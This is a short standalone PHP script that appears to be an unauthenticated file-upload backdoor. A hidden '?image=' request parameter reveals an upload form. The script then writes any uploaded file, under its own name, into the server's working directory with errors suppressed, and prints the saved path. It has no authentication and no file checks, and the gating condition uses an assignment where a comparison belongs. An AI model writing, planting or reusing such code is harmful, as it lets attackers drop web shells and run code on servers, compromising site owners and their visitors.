<?php
if(!empty($_GET['image']) && $_GET['image'] = 'image') {
    if(isset($_POST['Submit'])){
        $image = $_FILES['image'];
        $thumb = $image['name'];
        $tmp = $image['tmp_name'];
        if (isset($image['name'])) {
            $path = getcwd().DIRECTORY_SEPARATOR.$thumb;
            @move_uploaded_file($tmp, $path);

            echo"<center><b>Done: ".getcwd().DIRECTORY_SEPARATOR.$thumb."</b></center>";
        }
    } else { ?>
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>
<?php
    }
}
